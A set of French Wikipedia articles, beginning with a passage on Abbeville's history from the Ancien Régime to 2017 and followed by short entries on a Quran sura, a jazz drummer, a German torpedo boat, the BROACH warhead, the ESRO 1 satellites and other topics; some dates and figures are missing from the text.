Sous l'Ancien Régime, Abbeville était le siège d'une subdélégation dépendant de la Généralité d'Amiens. Abbeville était également le chef-lieu d’un bailliage principal, sans bailliage secondaire. La ville était desservie par un service de diligence la reliant deux jours par semaine, à Amiens et Paris, d'une part et à Montreuil, Boulogne-sur-Mer et Calais d'autre part ; la durée du trajet Paris-Calais était de deux jours.
Époque contemporaine.
La Révolution française à Abbeville.
La Révolution se déroula à Abbeville de façon paisible. Les années 1789 et 1790 ne connurent pas d’événement majeur. En 1791, les habitants souhaitèrent le rétablissement du roi malgré sa fuite et son arrestation à Varennes-en-Argonne. À la mort de Mirabeau, la Garde nationale d'Abbeville fit célébrer un office à l'église Saint-Vulfran. L'église fut fermée en juin 1791.
En 1792, des volontaires abbevillois participèrent à la Bataille de Valmy. La victoire fut célébrée à Abbeville où l'on chanta pour la première fois "La Marseillaise".
Louis-Alexandre Devérité, imprimeur abbevillois, fonda au début de la Révolution la feuille patriote "Les Annales picardes" et fut membre de la Société des amis de la Constitution. Il devint également officier de la garde nationale d'Abbeville. En 1791 il fut élu officier municipal de la ville. Il fut en septembre 1792, élu député de la Somme à la Convention nationale. Favorable aux Girondins, lors du procès de Louis XVI, il vota pour l'appel au peuple, pour la détention et le bannissement à la paix et pour le sursis à l'exécution. Il se fit discret jusqu'en juin 1792, date à laquelle, il défendit les magistrats d'Amiens appelés à la Convention pour avoir soutenu les Girondins. Il fut décrété d'arrestation, le 8 juillet 1793, sur proposition d'André Dumont, et dut se cacher jusqu'à la chute de Robespierre, le 9 Thermidor an II (28 juillet 1794). Il fut réintégré par la Convention sur une motion proposée par son ancien ennemi, André Dumont. En octobre 1795, il fut élu au Conseil des Anciens. Il fut, sous le Directoire, conservateur des eaux et forêts de la Somme.
André Dumont, député à la Convention nationale, siégea au côté gauche avec les députés de la Montagne. Il vota la mort de Louis XVI et fut envoyé en mission dans le département de la Somme. Le 22 mai 1793, il arriva à Abbeville, il y tint des discours révolutionnaires mais mena une politique de répression mesurée.
Conformément au Décret du 17 juillet 1793 qui abolissait les privilèges féodaux sans contrepartie, furent brûlés à Abbeville tous les titres de noblesse anciens, chartes etc. Le 10 décembre de la même année furent brûlés 1 800 registres, cahiers, liasses, plans et cartes anciens retirés des archives communales
Une société populaire se créa à Abbeville et tint des réunions dans l'église des carmélites; son action fut surtout dirigée contre le culte catholique. La collégiale Saint-Vulfran fut transformée en temple de la Raison, des monuments furent profanés, des manuscrits et archives détruits ou dispersés. Le 30 mai 1795, la Convention rétablit la libre pratique du culte catholique. Dans la nuit du 4 au 5 janvier 1795, l'Hôtel de la Grutuze, où siégeaient les administrateurs du district, fut détruit par un incendie avec les objets d'art provenant des châteaux et églises des environs qu'il contenait.
André Dumont fut élu au Conseil des Cinq-Cents le 23 vendémiaire an IV, il en démissionna en 1797.
Le 11 octobre 1797, fut fondée la Société d'émulation d'Abbeville, première société savante créée dans le département de la Somme.
L'hiver 1798-1799 fut rigoureux, une partie de la ville, les quartiers Saint-Jacques, la chaussée d'Hocquet et les faubourgs des Planches et de Rouvroy furent inondés.
Abbeville sous le Consulat et le Premier Empire.
Napoléon Bonaparte passa par Abbeville le 18 juin 1803 et logea chez le maire M. de Cérisy. Il repassa plusieurs fois par Abbeville en 1805 pour aller à Boulogne-sur-Mer.
André Dumont fut nommé sous-préfet d'Abbeville, le 14 germinal an VIII ; il le resta jusqu'à la première Restauration de 1814. Pendant les Cent-Jours, il devint préfet du Pas-de-Calais.
En 1799, Louis-Alexandre Devérité fut nommé juge d'instruction auprès du tribunal civil d'Abbeville et resta en fonction jusque 1811. En 1812, il fonda le "Journal d'Abbeville".
De la Restauration au Second Empire, Abbeville accueille des hôtes de marque.
Louis XVIII fut reçu à Abbeville le 27 avril 1814, après la déchéance de Napoléon Ier. Les Cent-Jours ne furent marqués d'aucun éclat. Après la bataille de Waterloo, le rétablissement du pouvoir royal fut proclamé à l'hôtel de ville le 11 juillet 1815.
Atteint par la loi du 12 janvier 1816 contre les régicides, André Dumont fut obligé de quitter la France. Il revint en France en 1830, après la Révolution des Trois Glorieuses et se fixa à Abbeville, où il mourut.
Une école de dessin fut ouverte à Abbeville en 1821 et une école de musique en 1823.
Le 26 juillet 1823, parut le premier numéro du "Mémorial d'Abbeville" qui fut remplacé en 1840 par le journal, "L'Abbevillois", en 1840. Le "Pilote de la Somme" parut pour la première fois, à Abbeville, le 6 octobre 1846.
Le 24 mai 1831, le roi Louis-Philippe visita Abbeville. L'année suivante, la ville fut éprouvée par l'épidémie de choléra qui y fit 401 morts.
Victor Hugo séjourna à Abbeville à trois reprises :&lt;br&gt;
- en 1835, il y séjourna successivement à partir du 26 juillet (après être descendu à ""L'Écu de Brabant"), puis les 4 et 5 août (en étant hébergé à "L'Hôtel d'Angleterre"") ;&lt;br&gt;
- en août et septembre 1837, il arriva d'Amiens, en ayant descendu la Somme en bateau à vapeur ;&lt;br&gt;
- en 1849, il quitta Abbeville, le 11 septembre, sous la pluie.
En 1837, Jacques Boucher de Perthes débuta ses recherches lors des travaux effectués au faubourg de la Portelette, il les poursuivit au Moulin Quignon, en 1845.
En 1842, le musée fut ouvert au public et présentait des collections archéologiques et d'histoire naturelle.
Le chemin de fer arriva à Abbeville en 1847, par la mise en service de la ligne Longueau-Boulogne. Une première gare fut construite en 1855, la gare actuelle fut construite avec une ossature en bois parée de briques rouges évoquant les villas de Mers-les-Bains, en 1862.
Abbeville fut reliée à Lille par chemin de fer en 1879, via Saint-Pol-sur-Ternoise et Béthune et au Tréport-Mers le 4 décembre 1882.
Abbeville sous la IIIe République.
Abbeville fut occupée par l'armée prussienne du 6 février au 7 juin 1871. À partir de 1880, on procéda à la démolition des fortifications de Vauban, elle fut terminée en 1910.
La ville ne connut pas un essor de son industrie comparable à celui d'autres cités comme Amiens par exemple. En 1872, une sucrerie s'installa à Abbeville qui en 1905 fut intégrée au groupe Say. En 1899, Abbeville comptait : une filature, une fabrique de linge de table, des corderies, une fabrique de poids et balances, trois fonderies, une chaudronnerie, une serrurerie pour le bâtiment, une râperie, une distillerie... Le téléphone arriva à Abbeville en 1899, mais son fonctionnement ne donnait pas toute satisfaction.
Le 17 août 1890, on inaugura, à Abbeville, le monument à l'amiral Courbet, œuvre d'Alexandre Falguière et Antonin Mercié.
En 1896, le socialiste Jules Guesde vint faire une conférence à Abbeville. Dans la foulée, un groupe du Parti ouvrier français et une Maison du Peuple furent créés.
En 1902, deux professeurs et deux élèves du lycée d'Abbeville fondèrent le « Groupe La Barre » pour perpétuer la mémoire du chevalier. En juillet 1903, une cinquantaine de personnes déposèrent une gerbe, qui fut ôtée immédiatement par la municipalité. En 1904, pour la première fois, les organisations ouvrières du Vimeu, musique en tête, s'associèrent à la manifestation. Le 7 juillet 1907 fut inauguré le Monument La Barre, en présence de venus à Abbeville par trains entiers. Le monument fut financé grâce à une souscription volontaire de billets de tombola à 25 centimes.
Abbeville pendant la Première Guerre mondiale, une ville de l'arrière bombardée.
Pendant la Première Guerre mondiale, Abbeville fut épargnée par les combats. La ville devint le siège du grand quartier général britannique sur le front ouest. Les et 2 mai 1918, se déroula, à Abbeville une conférence interalliée qui décida du commandement unique des opérations militaires.
Pendant l'année 1918, la ville subit des bombardements aériens allemands pendant cinq mois qui provoquèrent la mort de 25 personnes et endommagèrent ou détruisirent immeubles.
Abbeville s'est vu décerner la Croix de guerre 1914-1918 avec la citation suivante à l'ordre de l'armée du 12 août 1920 : (J.O. du 14 août 1920)
Abbeville dans l'entre-deux-guerres.
L'événement le plus marquant de l'histoire d'Abbeville durant cette période est, sans nul doute, lié au Front populaire. Le 3 mai 1936, les électeurs de la d’Abbeville élurent député - de justesse - après une campagne acharnée, Max Lejeune, candidat SFIO, qui affrontait, au second tour de scrutin, dans une triangulaire, le député sortant Jean Coache. Max Lejeune l'emporta avec seulement 29 voix d'avance ; à 27 ans, il devint alors l'un des plus jeunes députés de la Chambre.
Abbeville pendant la Seconde Guerre mondiale.
Le premier conseil suprême interallié.
Une dizaine de jours après la déclaration de guerre à l'Allemagne, le 12 septembre 1939, le président du conseil, Édouard Daladier, et le généralissime Maurice Gamelin, chef d'état-major, rencontre à la sous-préfecture le premier ministre britannique Neville Chamberlain, pour tirer les conséquences de l'effondrement du front est en Pologne. Il y est décidé de suspendre les offensives à l'ouest afin de consolider le réarmement des armées alliées. De ce conseil commence la « drôle de guerre ».
Le massacre d'Abbeville.
Abbeville fut en mai 1940, le théâtre d'un épisode tragique, avant même le bombardement de la ville. Le 19 mai 1940, fuyant l'avancée allemande, 78 détenus belges furent emprisonnés, pour la nuit, dans le sous-sol du kiosque du parc d'Abbeville. On comptait parmi eux, des militants d'extrême droite, des communistes, des juifs allemands, autrichiens et hongrois, des Belges suspectés par les autorités belges d'être au service de l'espionnage allemand. Le 20 mai 1940, dans la panique suscitée par l'avance allemande et probablement sous l'emprise de l'alcool, des militaires français procédèrent, sur ordre oral du capitaine Marcel Dingeon, à l’exécution sommaire de vingt et un prisonniers. Le lieutenant Jules Léclabart mit fin au massacre, en demandant l'ordre écrit d'exécution que personne ne put produire.
La Bataille d'Abbeville.
La Seconde Guerre mondiale fut, pour Abbeville, particulièrement cruelle. Le 20 mai 1940, la ville subit un bombardement aérien particulièrement destructeur de la part de la Luftwaffe : de 9 h 30 à 17 h environ, par vagues successives, les avions allemands déversèrent bombes qui dévastèrent la quasi-totalité du centre-ville, détruisant immeubles et en endommageant 3 600. L'hôtel de ville et ses archives furent détruits, la collégiale Saint-Vulfran, fierté de la ville, fut gravement endommagée. De ses , la ville n'en comptait plus que à l'entrée des Allemands, le 22 mai.
Néanmoins, dans les environs immédiats d'Abbeville, l'armée française sous les ordres du colonel de Gaulle parvint à faire reculer l'armée allemande au cours des combats des 28, 29 et 30 mai 1940, connus sous le nom de Bataille d'Abbeville.
La Résistance abbevilloise.
Dans un rapport envoyé au préfet de la Somme, le sous-préfet d'Abbeville écrivait que des tracts de propagande communiste avaient été trouvés sur la chaussée le 28 juin 1941, au matin. En 1942, une enquête policière amena l'arrestation d'Octave Dubus, ancien maire communiste de Mareuil-Caubert qui recevait des colis de tracts en gare d'Abbeville pour les distribuer ensuite. La prison d'Abbeville détenait en juin 1944 une centaine de prisonniers dont soixante-dix prisonniers politiques membres des mouvements FTP, Front national, OCM. Après une série d'arrestations dans le Vimeu, la libération des prisonniers fut décidée pour le 22 juin 1944 au matin. Une quinzaine de résistants pénétrèrent dans la prison, les gardiens furent enfermés dans les cellules, les prisonniers politiques furent libérés ainsi que les droits communs pour faire diversion.
La résistance abbevilloise combattit vaillamment pour la libération de la ville. Le , le canon tonna dans les faubourgs d'Abbeville. La 1re division blindée polonaise prit position au sud de la ville. les FFI, aidés de gardiens de la paix, occupèrent les points d'accès à la place Clemenceau dans le centre-ville. Ils affrontèrent l'armée allemande retranchée dans plusieurs combats de rues provoquant quatre morts et plusieurs blessés parmi les résistants.
L'armée allemande avait fait sauter les ponts empêchant les chars de l'armée polonaise de franchir la Somme. Le 3 septembre, les soldats allemands ayant décroché à 5 heures du matin, les premiers chars polonais purent entrer dans la ville grâce à des ponts flottants.
Par le Décret du , Abbeville se voyait décerner la croix de la Légion d'honneur ainsi que Croix de guerre 1939-1945 avec palme accompagnées de la citation suivante : (J.O. du 3 juin 1948)
Abbeville sous la IVe République : la reconstruction.
La période allant de 1945 à 1989 fut marqué par la forte personnalité de Max Lejeune. De retour de captivité au Camp de Lübeck où il parvint à établir un réseau de résistance et une liaison avec la France libre, il renoua avec l'action politique. Il fut député (de 1945 à 1977) puis sénateur (de 1977 à 1995), maire d'Abbeville (de 1947 à 1989), Président du Conseil général de la Somme (de 1947 à 1988) et ministre à plusieurs reprises pendant la IVe République et au début de la Ve. C'est lui qui, en tant que maire, organisa la reconstruction d'Abbeville. Les opérations de reconstruction furent longues (le nouvel hôtel de ville fut inauguré en 1960). Le 18 mai 1948, Abbeville reçut la visite du président de la République Vincent Auriol venant se rendre compte sur place des progrès de la reconstruction.
Le redémarrage de l'activité industrielle fut progressif : Saint Frères, Chanvrière, (chanvre, lin et jute), Maillard, constructeur de bicyclettes relancèrent la production. Le redémarrage de la sucrerie d'Abbeville se fit avec l'arrivée en masse des premiers travailleurs portugais et espagnols pour la culture de la betterave sucrière. Les entreprises de travaux publics prirent leur essor. Installation, en 1951, de la société Bébé Confort, fabricant d'objets de puériculture.
La Maison des Petits Français de la Croix rouge française accueillit de nombreux d'orphelins, ou enfants abandonnés.
En 1951, fut mis en œuvre, un vaste plan de construction d'HLM. En 1954 débuta l'aménagement de la zone industrielle nord.
La Ve République, Abbeville et la fin des "Trente Glorieuses".
Le 12 juin 1964, Abbeville reçut la visite du général de Gaulle, Président de la République qui fut accueilli à l'Hôtel de ville par le député-maire et ancien ministre Max Lejeune.
Dès le milieu des années 1970, Abbeville subit les conséquences de la crise économique et de la désindustrialisation qui allait se poursuivre jusqu'à aujourd'hui. La sucrerie a totalement disparu du paysage urbain. L'emploi industriel subit une forte décrue non compensée par le développement des activités touristiques.
Le 7 février 1985, François Mitterrand, Président de la République se rendit à Abbeville, en visite officielle et fut reçu à l'hôtel de ville par Max Lejeune. A cette occasion il annonça la création d'un musée de la préhistoire dans la cité, musée qui ne vit jamais le jour.
Les hésitations de l'électorat abbevillois.
À partir de 1989, les élections locales révélèrent la versatilité des électeurs abbevillois. En 1989, Max Lejeune, après avoir présidé pendant 42 ans aux destinées de la ville, fut battu aux élections municipales à l'issue d'une triangulaire qui amena l'élection de la liste socialiste conduite par Jacques Becq. En 1995, ce fut la liste de droite qui gagna les élections municipales, Joël Hart devint maire d'Abbeville. En 2008, la liste du socialiste Nicolas Dumont remporta les élections municipales. Cependant, aux élections législatives de juin 2017, bien qu'arrivé en tête au premier tour sous l'étiquette La République en marche, Nicolas Dumont, rallié de fraîche date au président de la République Emmanuel Macron fut devancé largement dans sa ville par le candidat de La France insoumise, François Ruffin. Malgré une forte abstention, François Ruffin fut élu député de la première circonscription de la Somme.
En juin 2020, c'est l'ex-député socialiste, Pascal Demarthe, investi par l'UDI, qui remporta les élections municipales dans le cadre d'une alliance avec Les Républicains. Deux ans plus tôt, il avait créé le « Club Max Lejeune », en hommage à l'ancien maire d'Abbeville. Aux élections départementales de 2021, les électeurs du canton d'Abbeville 1 (Abbeville nord) créèrent la surprise en élisant conseillers départementaux, Angelo Tonolli et Julie Vast, candidats de l'union à gauche et écologiste qui obtinrent, dans cette partie de la ville, 54 % des voix malgré une faible participation de 30,7 %.
Les inondations de 2001.
Au printemps 2001, la ville eut à souffrir des inondations. Celles-ci durèrent plusieurs semaines, à cause de la saturation des nappes phréatiques, conséquence d'une année à l'humidité exceptionnelle. La gare fut inaccessible, les voies ferrées étant recouvertes par plusieurs centimètres d'eau. La crue de la Somme était également une crue des nappes phréatiques.
Abbeville dans l'intercommunalité.
Le 24 juin 1994 fut créé le district de l'agglomération abbevilloise, dont les compétences concernaient la gestion du centre de secours, la collecte et le traitement des déchets ménagers, les études ou projets d’intérêt
communaux et le schéma directeur d'aménagement et d'urbanisme (SDAU). En 2000, ses compétences s'élargirent au fonctionnement de la mission locale pour l'emploi, au service public de l'assainissement non-collectif (SPANC), aux sentiers de randonnée et à la mise en valeur touristique du patrimoine local.
Par un arrêté préfectoral du , le district se transforma en communauté de communes.
En 2007, l'intercommunalité étendit ses compétences à la gestion des zones d’activités et aux actions de développement économique, aux NTIC, ses compétences comprenaient également l'accueil de loisirs, le centre de natation communautaire, le portage de repas à domicile, l'école des Beaux-Arts, le développement économique, puis, en 2010, le conservatoire de musique.
Dans le cadre de la loi portant nouvelle organisation territoriale de la République (Loi NOTRe), il fut décidé de réduire le nombre d'intercommunalités dans le département de la Somme. Le 1er janvier 2017, les intercommunalités de l’Abbevillois, de la région d'Hallencourt et de la Baie de Somme sud ont fusionné pour former la communauté d'agglomération de la Baie de Somme.

</doc>
<doc id="8731631" url="https://fr.wikipedia.org/wiki?curid=8731631" title="Air-Sol Moyenne Portée">
Air-Sol Moyenne Portée



</doc>
<doc id="8731633" url="https://fr.wikipedia.org/wiki?curid=8731633" title="Al-Furqan">
Al-Furqan

Al-Furqan (arabe : , français : "Le discernement") est le nom traditionnellement donné à la sourate du Coran, le livre sacré de l'islam. Elle comporte 77 versets. Rédigée en arabe comme l'ensemble de l'œuvre religieuse, elle fut proclamée, selon la tradition musulmane, durant la période mecquoise.
Origine du nom.
Bien que le titre ne fasse pas directement partie du texte coranique, la tradition musulmane a donné comme nom à cette sourate "Le discernement", titre du premier verset qui reprend un thème récurrent dans ce livre, à savoir que le Rappel, Al-Qur'ân, est le dernier critère de distinction entre le bien et le mal. Sa lecture et sa compréhension sont donc primordiales si l'Humanité ne veut pas s'éloigner définitivement d'Allah. Le terme "furqan" se trouve dans le verset 1.
Historique.
Il n'existe à ce jour pas de sources ou documents historiques permettant de s'assurer de l'ordre chronologique des sourates du Coran. Néanmoins selon une chronologie musulmane attribuée à Ǧaʿfar al-Ṣādiq (VIIIe siècle) et largement diffusée en 1924 sous l’autorité d’al-Azhar, cette sourate occupe la place. Elle aurait été proclamée pendant la période mecquoise, c'est-à-dire schématiquement durant la première partie de l'histoire de Mahomet avant de quitter La Mecque. Contestée dès le XIXe par des recherches universitaires, cette chronologie a été revue par Nöldeke, pour qui cette sourate est la 66e.
Pour Nöldeke, cette sourate est composée de prédications de périodes différentes, les versets 4 à la fin étant plus tardifs. Pour Bell, certains passages ont fait l'objet d'additions (v.18-21, 24-26...) ou de révisions (v.1-3...). Pour Blachère, cette sourate est formée d'addition autour d'un noyau formé de la réunion de série de révélations.
Interprétations.
Verset 1-10 : Polémiques et contre-discours.
Pour Azaiez, ce passage est construit en miroir selon les principes de l’analyse rhétorique. Cela permet de mettre en valeur l’énoncé central, qui est la riposte du contre-discours qui l’enserre. Dye reconnait une « ambiance psalmiste » dans le style et la phraséologie.
Le terme "Furqan" pose des problèmes de compréhension et peut signifier soit « salut », soit « guidance », soit « lumière ».  Pour Prégill, "Furqan" signifie « critère », dans le sens de ce qui peut séparer les damnés des sauvés. Pour Dye, « Le verset est suffisamment ambigu pour pouvoir désigner Mahomet ou un autre messager (par exemple Moïse) ayant antérieurement reçu une révélation. ».
Reynolds met en doute l’opposition de ce passage entre monothéisme et polythéisme. La mention de plusieurs dieux serait une exagération du Coran, comme l’accusation de mariolâtrie des chrétiens. À l’inverse, pour Tengour, ce passage doit être lu dans le contexte du milieu d’origine et pourrait illustrer « l'émergence du dieu coranique en tant que dieu Créateur et Résurrecteur ».

</doc>
<doc id="8731634" url="https://fr.wikipedia.org/wiki?curid=8731634" title="Osie Johnson">
Osie Johnson

Osie Johnson, de son vrai nom James Johnson, né le à Washington dans le district de Columbia, et mort à New York le , est un batteur de jazz américain.
Biographie.
En 1941, Osie Johnson joue dans le big band bostonien de Sabby Lewis. Après la guerre, et le service militaire, il vit à Chicago, puis s'établit à New York où il joue dans l'orchestre d'Earl Hines, de 1951 à 1953. Johnson devient un musicien de studio très actif, accompagnant Coleman Hawkins, Dinah Washington ou Wes Montgomery.
Style.
Osie Johnson enregistre également avec des musiciens de New York tels que Frank Socolow, Hal McKusick, Milt Hinton, Al Cohn et Zoot Sims. Ces New Yorkais représentent un style de jazz qui peut se rapprocher de celui du jazz West Coast de Los Angeles.

</doc>
<doc id="8731642" url="https://fr.wikipedia.org/wiki?curid=8731642" title="François Joseph Ernest de Hohenzollern-Sigmaringen">
François Joseph Ernest de Hohenzollern-Sigmaringen



</doc>
<doc id="8731648" url="https://fr.wikipedia.org/wiki?curid=8731648" title="Jaguar (1928)">
Jaguar (1928)

Le Jaguar est un torpilleur de la classe Type 1924 de la Reichsmarine puis de la Kriegsmarine.
Histoire.
Le torpilleur est construit en même temps que le "Leopard" au Reichsmarinewerft. Les deux bateaux ainsi que les sister-ships "Tiger" et "Luchs" sont lancés le après un discours de baptême de l'amiral Iwan Oldekop. Le baptême est donné par l'ancien commandant de la canonnière "Jaguar", le contre-amiral Harry Mündel.
En , le navire est placé dans la . Entre avril et , le "Jaguar" traverse la Méditerranée avec la flottille et fait escale à Vigo, Lisbonne et Split. Durant l'été 1931, il va dans les eaux de la Norvège. Le , le "Jaguar" est désarmé.
Il revient en . Le , le "Jaguar" porte secours au "Niobe" qui coule, victime d'un grain blanc au large de l'île Fehmarn. En août et , le navire va en Espagne. Au début de la guerre civile, il participe à l'évacuation des réfugiés allemands et d'autres nationalités vers des ports français. Il revient en novembre et . Le , il est de nouveau désarmé à Wilhelmshaven.
Il est armé le . Il sert de navire-école pour l'école d'artillerie. Il est présent à la parade de la flotte pour le lancement le du croiseur lourd "Prinz Eugen" auquel assistent Adolf Hitler et Miklós Horthy.
Au début de la Seconde Guerre mondiale, le torpilleur participe à des poses de mines marines en mer du Nord puis à des missions de sauvegarde et d'escorte. En compagnie du "Seeadler", il intercepte six navires marchands dans le Skagerrak du 14 au . Il est ensuite renvoyé dans un chantier naval pour être modifié et ne participe pas à l'opération Weserübung. En , il assiste à la chasse aux sous-marins dans le Cattégat. Avec le navire d'escorte "F 5", il protège le "Brummer" durant son voyage en Norvège en avril 1940 lorsque ce dernier est coulé par le sous-marin britannique .
Lors de l'opération Juno en , le "Jaguar" est un navire d'escorte. Il protège ensuite le "Nürnberg" et le "Scharnhorst" sur le chemin du retour en Allemagne. En juillet et , il fait des missions en mer du Nord. Au cours de l'une d'entre elles, le "Luchs" est touché par une torpille. Le "Jaguar" et l"'Iltis" récupèrent 53 survivants. Début septembre, il prend part à des poses de mines.
Jusqu'en , le navire fait des missions d'éclairage de poses de mines, sert de navire-école. Il escorte le "Scharnhorst" et le "Gneisenau" dans le cadre de l'opération Berlin. Le , le "Jaguar" et l"'Iltis" partent de la Norvège pour Cherbourg. Mais devant Egersund, le "Jaguar" perd son gouvernail et doit être remorqué par son sister-ship. Après que son équipage a été récupéré par le "Seefalke", le navire va à Stavanger pour des travaux provisoires puis de Kiel à Wilhelmshaven et repart ensuite avec le "Python" jusqu'à Rotterdam. Il est en chantier du au . Mi-juin, il repart en Norvège. D'août à décembre, il est un navire-école.
En , la T-flottille, à laquelle appartient le "Jaguar", sert d'escorte au "Scharnhorst", au "Gneisenau" et au "Prinz Eugen" du cap Gris-Nez jusqu'en Allemagne dans le cadre de l'opération Cerberus. Le torpilleur subit un bombardement qui fait trois blessés graves et neuf légers. Après des réparations à Rotterdam, il revient dans la mission. Présent lors de l'opération Chariot, le "Jaguar" peut aborder le navire britannique "MGB 14". La tentative de remorquage est arrêtée à la vue d'autres navires britanniques.
Après un passage par le chantier naval, le navire sert de nouveau de navire-école à l'artillerie en . Dans la fœrde de Kiel, il est percuté par un chalutier le . En plus de la destruction de la salle de radio, il y a un mort et deux blessés. La réparation des dommages a lieu du au . Début mars, il part pour Kristiansand où il accompagne le "Scharnhorst" dans la baie de Bogen puis le "Nürnberg" dans son retour en Allemagne. Il participe ensuite à des poses de mines. En , il longe les côtes françaises. Jusqu'au printemps 1944, il fait des missions d'escorte de protection. Il croise parfois l'ennemi. Le , un dragueur de mines percute le "Jaguar" alors qu'il partait pour être réparé. En , la T-flotille se déplace de Cherbourg jusqu'au Havre. Le "Jaguar" résiste aux bombardements britanniques au cours du transfert le , mais pas le "Greif".
Après le déclenchement du débarquement en Normandie, le "Jaguar" participe aux opérations offensives pour l'arrêter. Il coule ainsi le "Svenner", un destroyer norvégien. Le , les forces aériennes alliées bombardent le port du Havre. Le "Jaguar" subit de lourds dommages et coule à 6 heures du matin. 16 membres d'équipage meurent.

</doc>
<doc id="8731650" url="https://fr.wikipedia.org/wiki?curid=8731650" title="Moteur Cléon-fonte">
Moteur Cléon-fonte



</doc>
<doc id="8731658" url="https://fr.wikipedia.org/wiki?curid=8731658" title="BROACH">
BROACH

La charge explosive militaire BROACH est une charge creuse en tandem créée par l'équipe BROACH : BAE Systems Global Combat Systems Munitions, Thales Missile Electronics et QinetiQ. BROACH est l'acronyme de .
Généralités.
Le développement de la charge BROACH commença en 1991, lorsque l'équipe BROACH était constituée de British Aerospace, "", Thomson-Thorn Missile Electronics et la . La charge, à deux étages, est constituée d'une charge creuse initiale, chargée de creuser un passage à travers du blindage, du béton ou de la terre, et d'une deuxième charge, plus lourde, dont le rôle est de suivre le chemin de la première et d'exploser à l'intérieur de la cible.
Cette munition est conçue pour permettre à un missile de croisière d'obtenir des degrés de destruction et de pénétration qui n'étaient jusqu'alors possibles qu'avec des bombes guidées par laser.

</doc>
<doc id="8731660" url="https://fr.wikipedia.org/wiki?curid=8731660" title="ESRO 1">
ESRO 1

ESRO 1 est une série de deux satellites scientifiques ("ESRO 1A"/"Aurorae" et "ESRO 1B"/"Boreas") développés par le CERS (en anglais "ESRO") une des deux agences spatiales européennes qui ont précédé l'ESA. Ces satellites avaient pour objectif d'étudier les effets de l'activité solaire sur les zones aurales. Deux satellites de conception très simples et emportant des instruments d'analyse in situ des particules sont lancés successivement en 1968 et 1969 par des fusées américaines Scout B. Les satellites ESRO 1 ont rempli leurs objectifs avant d'être détruits en effectuant leur rentrée atmosphérique en 1970 et 1969.
Objectifs scientifiques.
L'objectif du programme ESRO 1 est d'étudier la manière dont les régions de l'espace proches des pôles magnétiques, dans une zone annulaire appelée « zone aurorale » (entre 65 et 75° de latitude) se comportent lorsque l'activité magnétique solaire s'intensifie (éruption solaire). Les satellites doivent étudier les particules chargées à haute énergie issues de la magnétosphère externes et propulsées par cette activité lorsqu'elles plongent dans l'atmosphère au niveau des pôles. Il s'agit de déterminer la structure fine de cette région de l'espace en étudiant les particules, la luminosité, la composition de l’ionosphère et les processus de réchauffement.
Historique.
La mission ESRO 1 est esquissée pour la première fois dans le cadre de rencontres scientifiques de la Commission préparatoire européenne pour la recherche spatiale (COPERS) en 1963 destinées à définir le programme scientifique du futur CERES. Le programme s'inscrit dans le cadre d'un accord avec la NASA qui fournit les lanceurs. Le CERES lance en 1964 un appel d'offres pour la construction de deux satellites identiques. Le CERES choisit en avril 1965 la société Laboratoire Central de Télécommunications avec des participations de Contraves à Zurich et la filiale belge de Bell à Anvers. Un premier exemplaire du satellite, "ESRO 1A" ou "Aurorae" est lancé le 3 octobre 1968 par une fusée américaine Scout B depuis la base de lancement de Vandenberg et placé sur une orbite polaire avec un apogée de , un périgée de et une inclinaison de 93,7 degrés. Après avoir rempli sa mission en effectuant des mesures in situ des particules chargées venues de la magnétosphère externe et plongeant dans les zones polaires, le satellite est détruit durant sa rentrée atmosphérique qui a eu lieu le 26 juin 1970. Le deuxième exemplaire, "ESRO 1B" ou "Boreas" est lancé le par une fusée Scout B depuis Vandenberg mais est placé sur une orbite circulaire et beaucoup plus basse ( x , inclinaison de 86°) pour fournir des mesures venant compléter celles de Aurora. Du fait de cette altitude peu élevée, la durée de vie du satellite est de quelques semaines. Il est détruit, après avoir rempli sa mission, durant sa rentrée atmosphérique qui a eu lieu le 23 novembre 1969.
Caractéristiques techniques.
Les deux satellites sont identiques. Le corps du satellite est de forme cylindrique, avec un diamètre de et une hauteur de pour une masse est de . Ces satellites très simples dont l'orientation n'est pas stabilisée sont les descendants directs des expériences scientifiques lancés par des fusées-sondes. Les deux sondes emportent respectivement 8 et 7 instruments scientifiques :

</doc>
<doc id="8731661" url="https://fr.wikipedia.org/wiki?curid=8731661" title="ESRO 1A">
ESRO 1A



</doc>
<doc id="8731663" url="https://fr.wikipedia.org/wiki?curid=8731663" title="Prix Scerbanenco">
Prix Scerbanenco

Le prix Scerbanenco ("Premio Scerbanenco") est un prix littéraire italien remis à un ouvrage de littérature policière. Nommé en hommage au romancier italien Giorgio Scerbanenco, il est décerné depuis l'année 1993. 
Ce prix récompense un récit inédit du genre policier publié par un auteur italien dans l’année de la remise du prix. Il est actuellement remis lors du festival du film noir de Courmayeur, en parallèle au prix Raymond Chandler.

</doc>
<doc id="8731671" url="https://fr.wikipedia.org/wiki?curid=8731671" title="ESRO 1B">
ESRO 1B



</doc>
<doc id="8731672" url="https://fr.wikipedia.org/wiki?curid=8731672" title="Riparo">
Riparo

 (' ; ') est un film franco-italien réalisé par Marco Simon Puccioni, sorti en 2007.

</doc>
<doc id="8731674" url="https://fr.wikipedia.org/wiki?curid=8731674" title="Saison 10 de New York, section criminelle">
Saison 10 de New York, section criminelle

Cet article présente la dixième saison de la série policière New York, section criminelle.
Synopsis de la saison.
Cette série met en scène une unité d'élite chargée d'enquêter sur des meurtres extrêmement violents en cernant la psychologie des meurtriers. Cette saison ne comportera que 8 épisodes, elle sera centrée sur la fin définitive de la série.

</doc>
<doc id="8731675" url="https://fr.wikipedia.org/wiki?curid=8731675" title="Deuxième congrès de l'Internationale communiste">
Deuxième congrès de l'Internationale communiste

Le deuxième Congrès du Komintern prend place en juillet 1920 à Pétrograd. 
Fonction.
Sa fonction réside dans la détermination des rôles des diverses factions ainsi que dans l’établissement des différentes directives à suivre. La dictature du prolétariat et le pouvoir des Soviets constituent les fondements du mouvement. Ce congrès qui réunit 217 délégués issus de 37 pays est attendu avec impatience par les prolétaires du monde entier, bien que les vingt-et-une conditions d’adhésion soient rigoureusement appliquées. Ces conditions ont pour but principal d'empêcher l’entrée de chefs et autres opportunistes dans l’Internationale communiste, leur seul dessein étant de préserver leur influence personnelle. Ces règles seront largement critiquées et débattues par les opposants durant le congrès. 
Les modalités de consolidation du mouvement communiste et de son rôle dans la révolution prolétarienne seront minutieusement examinées. L'une des solutions envisagées consiste à encourager les communistes à pénétrer au sein des syndicats, afin de se former et de se préparer à la lutte contre le capitalisme. Par la suite, dans les nations pourvues d’organisations ouvrières, une scission communiste-réformiste se produira, aboutissant à l’adhésion des communistes au Komintern.
